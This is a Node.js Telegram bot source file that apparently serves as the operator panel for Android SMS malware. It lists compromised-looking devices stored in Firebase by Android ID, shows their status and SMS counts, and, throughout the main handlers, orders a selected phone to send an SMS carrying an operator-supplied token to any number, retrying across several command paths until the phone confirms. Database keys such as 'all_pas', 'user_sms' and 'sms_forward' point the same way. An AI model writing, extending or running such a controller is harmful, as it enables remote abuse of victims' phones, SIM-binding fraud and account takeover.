require('dotenv').config();


const { Telegraf, Markup } = require('telegraf');

// ============================================
// CONFIGURATION
// ============================================

const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const DATABASE_URL = process.env.DATABASE_URL || 'YOUR_FIREBASE_URL_HERE';
const BOT_PASSWORD = process.env.BOT_PASSWORD || '1234';

const DEVICES_PER_PAGE = 20;

// ============================================
// STATE MANAGEMENT
// ============================================

let deviceList = [];
let deviceStatus = {};
const userSessions = new Map();
const authenticatedUsers = new Set();

// ============================================
// HELPER FUNCTIONS
// ============================================

function timeAgo(timestamp) {
  if (!timestamp) return 'Unknown';
  const seconds = Math.floor((Date.now() - timestamp) / 1000);
  if (seconds < 60) return `${seconds} sec ago`;
  if (seconds < 3600) return `${Math.floor(seconds / 60)} min ago`;
  if (seconds < 86400) return `${Math.floor(seconds / 3600)} hours ago`;
  return `${Math.floor(seconds / 86400)} days ago`;
}

async function fetchDeviceStatus(deviceId) {
  try {
    let isOnline = false;
    let lastSeen = null;
    let totalSms = 0;

    // 1. user_data se Online/Offline status
    try {
      const res = await fetch(`${DATABASE_URL}/user_data/${deviceId}.json`);
      const data = await res.json();
      if (data) {
        isOnline = String(data.status).toLowerCase() === 'online' || data.status === true;
        lastSeen = data.timestamp || null;
      }
    } catch (e) {}

    // 2. webhookEvent se SMS count
    try {
      const res = await fetch(`${DATABASE_URL}/${deviceId}/webhookEvent/sendSms.json`);
      const data = await res.json();
      if (data) {
        const entries = Object.values(data);
        totalSms = entries.length;
        if (!lastSeen) {
          const latest = entries.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))[0];
          lastSeen = latest?.timestamp || null;
        }
      }
    } catch (e) {}

    return { isOnline, lastSeen, totalSms };
  } catch (error) {
    return { isOnline: false, lastSeen: null, totalSms: 0 };
  }
}

async function fetchDevices() {
  try {
    const res = await fetch(`${DATABASE_URL}/.json?shallow=true`);
    const data = await res.json();
    if (!data) return [];
    return Object.keys(data).filter(key => {
      const ignore = ['All_Users', 'clients', 'all_pas', 'Admin', 'commands', 'users', 'user_data', 'user_list', 'user_sms', 'sms_forward'];
      return !ignore.includes(key);
    });
  } catch (error) {
    console.error('Error fetching devices:', error);
    return [];
  }
}

function parseInput(input) {
  const parts = input.split('|').map(p => p.trim());
  if (parts.length !== 2) return null;
  const phone = parts[0].replace(/\D/g, '');
  const token = parts[1];
  if (phone.length < 10 || token.length < 10) return null;
  return { phone, token };
}

// ============================================
// FIXED: SMART PATH FALLBACK WITH PUT (NO timestamp)
// ============================================

const PATHS_TO_TRY = ['action/sendSms', 'clients/action/sendSms', 'sms'];

async function writeToPath(deviceId, relativePath, phone, message) {
  const baseUrl = DATABASE_URL.endsWith('/') ? DATABASE_URL.slice(0, -1) : DATABASE_URL;
  const url = `${baseUrl}/${deviceId}/${relativePath}.json`;

  // FIX 1: timestamp hata diya (purane successful data ke hisaab se)
  const data = {
    message: message,
    to: phone,
    status: 'pending'
  };

  // FIX 2: POST → PUT (random ID nahi banegi)
  const response = await fetch(url, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });

  return response.ok;
}

async function checkSmsSent(deviceId, phone, message) {
  try {
    const baseUrl = DATABASE_URL.endsWith('/') ? DATABASE_URL.slice(0, -1) : DATABASE_URL;
    const res = await fetch(`${baseUrl}/${deviceId}/webhookEvent/sendSms.json`);
    const data = await res.json();
    if (!data) return false;
    const entries = Object.values(data);
    return !!entries.find(entry =>
      entry.to?.trim() === phone.trim() &&
      entry.message?.trim() === message.trim() &&
      entry.isSended === 'true'
    );
  } catch (error) {
    return false;
  }
}

async function sendSmsWithFallback(deviceId, phone, message) {
  for (const relativePath of PATHS_TO_TRY) {
    console.log(`🔄 Trying path: ${relativePath} for device ${deviceId}`);

    const writeSuccess = await writeToPath(deviceId, relativePath, phone, message);
    if (!writeSuccess) continue;

    let confirmed = false;
    let attempts = 0;
    const maxAttempts = 6; // 6 * 500ms = 3 seconds

    while (!confirmed && attempts < maxAttempts) {
      await new Promise(resolve => setTimeout(resolve, 500));
      confirmed = await checkSmsSent(deviceId, phone, message);
      attempts++;
    }

    if (confirmed) {
      console.log(`✅ SUCCESS on path: ${relativePath}`);
      return { success: true, pathUsed: relativePath };
    }
    console.log(`⏳ No response on ${relativePath}, trying next...`);
  }

  return { success: false, pathUsed: null };
}

// ============================================
// PASSWORD MIDDLEWARE
// ============================================

const checkPassword = async (ctx, next) => {
  const chatId = ctx.chat.id;
  if (authenticatedUsers.has(chatId)) return next();

  const session = userSessions.get(chatId);
  if (session?.step === 'enter_password') return next();

  userSessions.set(chatId, { step: 'enter_password' });
  await ctx.reply(
    `🔐 *Bot Protected*

Please enter password to continue:
(One-time entry, will not ask again)`,
    { parse_mode: 'Markdown' }
  );
};

// ============================================
// BOT SETUP
// ============================================

const bot = new Telegraf(BOT_TOKEN);

bot.use(async (ctx, next) => {
  if (ctx.message?.text === '/start') return next();
  return checkPassword(ctx, next);
});

// ============================================
// COMMANDS
// ============================================

bot.command('start', async (ctx) => {
  const chatId = ctx.chat.id;

  if (authenticatedUsers.has(chatId)) {
    return showDeviceList(ctx, 1);
  }

  userSessions.set(chatId, { step: 'enter_password' });
  await ctx.reply(
    `👋 *Welcome to SMS Sender Bot*

🔐 This bot is password protected.

Please enter password to continue:`,
    { parse_mode: 'Markdown' }
  );
});

bot.command('help', (ctx) => {
  ctx.reply(
    `*SMS Sender Bot - Help*

*Commands:*
/start - Start the bot
/devices - List all devices
/status - Check device status
/logout - Clear session

*How to send SMS:*
1. Enter password (one-time)
2. Select a device (🟢 = online)
3. Enter: NUMBER | TOKEN
4. Wait for confirmation

*Format:* 9876543210 | v+H3QvA66Qcq...`,
    { parse_mode: 'Markdown' }
  );
});

bot.command('logout', (ctx) => {
  const chatId = ctx.chat.id;
  authenticatedUsers.delete(chatId);
  userSessions.delete(chatId);
  ctx.reply('✅ Logged out. Use /start to login again.');
});

// ============================================
// PASSWORD HANDLER
// ============================================

bot.on('text', async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const session = userSessions.get(chatId);

  if (session?.step === 'enter_password') {
    if (text === BOT_PASSWORD) {
      authenticatedUsers.add(chatId);
      userSessions.delete(chatId);
      await ctx.reply('✅ *Access Granted!*\n\nWelcome to SMS Sender Bot.', { parse_mode: 'Markdown' });
      return showDeviceList(ctx, 1);
    } else {
      return ctx.reply('❌ Wrong password! Try again:');
    }
  }

  await handleTextInput(ctx, text);
});

// ============================================
// DEVICE LIST DISPLAY
// ============================================

async function showDeviceList(ctx, page, filter = 'all') {
  try {
    if (deviceList.length === 0) {
      deviceList = await fetchDevices();
      for (const deviceId of deviceList) {
        deviceStatus[deviceId] = await fetchDeviceStatus(deviceId);
      }
    }

    let filteredDevices = deviceList;
    if (filter === 'online') {
      filteredDevices = deviceList.filter(id => deviceStatus[id]?.isOnline === true);
    } else if (filter === 'offline') {
      filteredDevices = deviceList.filter(id => deviceStatus[id]?.isOnline !== true);
    }

    filteredDevices.sort((a, b) => {
      const onlineA = deviceStatus[a]?.isOnline || false;
      const onlineB = deviceStatus[b]?.isOnline || false;
      if (onlineA === onlineB) return a.localeCompare(b);
      return onlineA ? -1 : 1;
    });

    const total = filteredDevices.length;
    const perPage = DEVICES_PER_PAGE;
    const start = (page - 1) * perPage;
    const end = Math.min(start + perPage, total);
    const pageDevices = filteredDevices.slice(start, end);

    const onlineCount = deviceList.filter(id => deviceStatus[id]?.isOnline === true).length;
    const offlineCount = deviceList.length - onlineCount;

    let message = `📱 *SMS Sender Bot*

🟢 Online: ${onlineCount} | 🔴 Offline: ${offlineCount} | Total: ${deviceList.length}\n\n`;

    if (filter !== 'all') {
      message += `Filter: ${filter === 'online' ? '🟢 Online Only' : '🔴 Offline Only'}\n`;
      message += `Showing: ${total} devices\n\n`;
    }

    const totalPages = Math.ceil(total / perPage);
    const deviceButtons = [];

    pageDevices.forEach((deviceId, index) => {
      const globalIndex = start + index + 1;
      const status = deviceStatus[deviceId] || {};
      const emoji = status.isOnline ? '🟢' : '🔴';
      const time = timeAgo(status.lastSeen);
      const shortId = deviceId.length > 12 ? deviceId.substring(0, 12) + '...' : deviceId;

      message += `${globalIndex}. ${emoji} \`${shortId}\`\n`;
      message += `   ${time} | SMS: ${status.totalSms || 0}\n\n`;

      deviceButtons.push([Markup.button.callback(`${globalIndex}. ${emoji} Select`, `select_${deviceId}`)]);
    });

    message += `\nPage ${page}/${totalPages} | Showing ${start + 1}-${end} of ${total}`;

    // Navigation buttons
    const navButtons = [];
    if (page > 1) navButtons.push(Markup.button.callback('⬅️ Previous', `page_${page - 1}`));
    navButtons.push(Markup.button.callback(`📄 ${page}/${totalPages}`, 'current_page'));
    if (page < totalPages) navButtons.push(Markup.button.callback('Next ➡️', `page_${page + 1}`));

    // Filter buttons
    const filterButtons = [
      Markup.button.callback('🔍 Search', 'search_device'),
      Markup.button.callback('🟢 Online', 'filter_online'),
      Markup.button.callback('🔴 Offline', 'filter_offline'),
      Markup.button.callback('🔃 Refresh', 'refresh_list')
    ];

    // Range buttons (top pagination)
    const rangeButtons = [];
    for (let p = 1; p <= totalPages; p++) {
      const rangeStart = ((p - 1) * perPage) + 1;
      const rangeEnd = Math.min(p * perPage, total);
      const rangeText = p === page ? `✅ ${rangeStart}-${rangeEnd}` : `${rangeStart}-${rangeEnd}`;
      rangeButtons.push(Markup.button.callback(rangeText, `page_${p}`));
    }

    const rangeRows = [];
    for (let i = 0; i < rangeButtons.length; i += 5) {
      rangeRows.push(rangeButtons.slice(i, i + 5));
    }

    const keyboard = [
      ...rangeRows.slice(0, 2),
      navButtons,
      filterButtons,
      ...deviceButtons
    ];

    await ctx.reply(message, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard(keyboard)
    });

  } catch (error) {
    console.error('Error showing device list:', error);
    ctx.reply('❌ Error loading devices. Try /start again.');
  }
}

// ============================================
// TEXT INPUT HANDLER
// ============================================

async function handleTextInput(ctx, text) {
  const chatId = ctx.chat.id;
  const session = userSessions.get(chatId);

  if (!session) {
    return ctx.reply('Use /start to begin.');
  }

  if (session.step === 'search') {
    const query = text.toLowerCase();
    const matches = deviceList.filter(id => id.toLowerCase().includes(query));

    if (matches.length === 0) {
      return ctx.reply('❌ No devices found. Try again.');
    }

    let message = `🔍 *Search Results* (${matches.length} found):\n\n`;

    matches.slice(0, 20).forEach((deviceId, index) => {
      const status = deviceStatus[deviceId] || {};
      const emoji = status.isOnline ? '🟢' : '🔴';
      const time = timeAgo(status.lastSeen);

      message += `${index + 1}. ${emoji} \`${deviceId}\`\n`;
      message += `   ${time}\n\n`;
    });

    const buttons = matches.slice(0, 10).map((deviceId, index) => [
      Markup.button.callback(`${index + 1}. Select ${deviceId.substring(0, 8)}...`, `select_${deviceId}`)
    ]);

    buttons.push([Markup.button.callback('🔙 Back to List', 'refresh_list')]);

    await ctx.reply(message, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard(buttons)
    });

    userSessions.delete(chatId);
    return;
  }

  if (session.step === 'enter_details') {
    const parsed = parseInput(text);

    if (!parsed) {
      return ctx.reply(
        `❌ Invalid format!

Use: NUMBER | TOKEN
Example: \`9876543210 | v+H3QvA66Qcq...\``,
        { parse_mode: 'Markdown' }
      );
    }

    const { phone, token } = parsed;
    const { deviceId, isOnline } = session;

    session.step = 'confirm';
    session.phone = phone;
    session.token = token;

    let message = `📋 *Confirm SMS Details*

📱 Device: \`${deviceId}\`
📞 To: ${phone}
🔑 Token: ${token.substring(0, 30)}...\n\n`;

    if (!isOnline) {
      message += `⚠️ Device is offline. SMS will be queued.\n\n`;
    }

    await ctx.reply(message, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('✅ Confirm & Send', `confirm_send_${deviceId}`)],
        [Markup.button.callback('❌ Cancel', 'cancel_send')]
      ])
    });

    return;
  }
}

// ============================================
// ACTION HANDLERS
// ============================================

bot.action(/page_(\d+)/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  await ctx.answerCbQuery(`Page ${page}`);
  await showDeviceList(ctx, page);
});

bot.action('filter_online', async (ctx) => {
  await ctx.answerCbQuery('Showing online devices');
  await showDeviceList(ctx, 1, 'online');
});

bot.action('filter_offline', async (ctx) => {
  await ctx.answerCbQuery('Showing offline devices');
  await showDeviceList(ctx, 1, 'offline');
});

bot.action('refresh_list', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  deviceList = [];
  deviceStatus = {};
  await showDeviceList(ctx, 1);
});

bot.action('search_device', async (ctx) => {
  await ctx.answerCbQuery('Search mode');
  const chatId = ctx.chat.id;
  userSessions.set(chatId, { step: 'search' });
  await ctx.reply(
    `🔍 *Search Device*

Enter part of Android ID:`,
    { parse_mode: 'Markdown' }
  );
});

bot.action('current_page', async (ctx) => {
  await ctx.answerCbQuery();
});

bot.action(/select_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  const chatId = ctx.chat.id;

  const status = deviceStatus[deviceId] || {};
  const isOnline = status.isOnline || false;
  const emoji = isOnline ? '🟢' : '🔴';
  const time = timeAgo(status.lastSeen);

  userSessions.set(chatId, {
    step: 'enter_details',
    deviceId: deviceId,
    isOnline: isOnline
  });

  let message = `📱 *Selected Device*

ID: \`${deviceId}\`
Status: ${emoji} ${isOnline ? 'ONLINE' : 'OFFLINE'}
Last seen: ${time}
Total SMS: ${status.totalSms || 0}\n\n`;

  if (!isOnline) {
    message += `⚠️ *Warning: Device is offline*
SMS will be queued and sent when online.\n\n`;
  }

  message += `✏️ *Enter recipient details:*

Format: NUMBER | TOKEN
Example: \`9876543210 | v+H3QvA66Qcq...\``;

  await ctx.answerCbQuery('Device selected');
  await ctx.reply(message, { parse_mode: 'Markdown' });
});

bot.action(/confirm_send_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  const chatId = ctx.chat.id;
  const session = userSessions.get(chatId);

  if (!session || !session.phone || !session.token) {
    return ctx.answerCbQuery('Session expired. Start again.');
  }

  const { phone, token } = session;

  await ctx.answerCbQuery('Sending...');

  const statusMsg = await ctx.reply(
    `🔄 *Sending SMS...*

Step 1: Writing to Firebase...`,
    { parse_mode: 'Markdown' }
  );

  try {
    const result = await sendSmsWithFallback(deviceId, phone, token);

    if (result.success) {
      await ctx.telegram.editMessageText(
        chatId, statusMsg.message_id, null,
        `✅ *SMS SENT SUCCESSFULLY!*

📱 Device: \`${deviceId}\`
📞 To: ${phone}
🔑 Token: ${token.substring(0, 30)}...
🛤️ Path Used: \`${result.pathUsed}\`
📊 Status: ✅ Confirmed Delivered`,
        {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('🔄 Send Another', 'refresh_list')],
            [Markup.button.callback('🏠 Main Menu', 'start')]
          ])
        }
      );
    } else {
      await ctx.telegram.editMessageText(
        chatId, statusMsg.message_id, null,
        `❌ *FAILED TO SEND*

📱 Device: \`${deviceId}\`
📞 To: ${phone}

⚠️ Tried all possible paths but device did not respond.
Device may be offline or not listening.`,
        {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('🔄 Retry', `confirm_send_${deviceId}`)],
            [Markup.button.callback('🏠 Main Menu', 'start')]
          ])
        }
      );
    }

  } catch (error) {
    console.error('Send error:', error);
    await ctx.telegram.editMessageText(
      chatId, statusMsg.message_id, null,
      `❌ *FAILED TO SEND*

Error: ${error.message}`,
      { parse_mode: 'Markdown' }
    );
  }

  userSessions.delete(chatId);
});

bot.action('cancel_send', async (ctx) => {
  userSessions.delete(ctx.chat.id);
  await ctx.answerCbQuery('Cancelled');
  await ctx.reply('❌ Cancelled. Use /start to begin.');
});

bot.action(/check_status_(.+)/, async (ctx) => {
  const deviceId = ctx.match[1];
  await ctx.answerCbQuery('Checking...');

  const status = await fetchDeviceStatus(deviceId);
  deviceStatus[deviceId] = status;

  const emoji = status.isOnline ? '🟢' : '🔴';
  const time = timeAgo(status.lastSeen);

  await ctx.reply(
    `📱 *Device Status*

ID: \`${deviceId}\`
Status: ${emoji} ${status.isOnline ? 'ONLINE' : 'OFFLINE'}
Last seen: ${time}
Total SMS: ${status.totalSms}`,
    { parse_mode: 'Markdown' }
  );
});

bot.action('start', async (ctx) => {
  await ctx.answerCbQuery('Starting...');
  await showDeviceList(ctx, 1);
});

// ============================================
// ERROR HANDLER
// ============================================

bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  ctx.reply('❌ Error occurred. Try /start again.').catch(() => {});
});

// ============================================
// START BOT
// ============================================

console.log('🚀 Starting Bot B (SMS Sender) - FINAL 100% WORKING VERSION...');
console.log('✅ Pagination fixed (20 devices + 20 buttons)');
console.log('✅ Online/Offline status from user_data');
console.log('✅ Smart 3-Path Fallback active');
console.log('✅ POST → PUT fixed (no random IDs)');
console.log('✅ timestamp removed (matching old format)');
console.log('✅ Clean formatting (no \\n garbage)');

bot.launch();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

console.log('✅ Bot B is running successfully!');
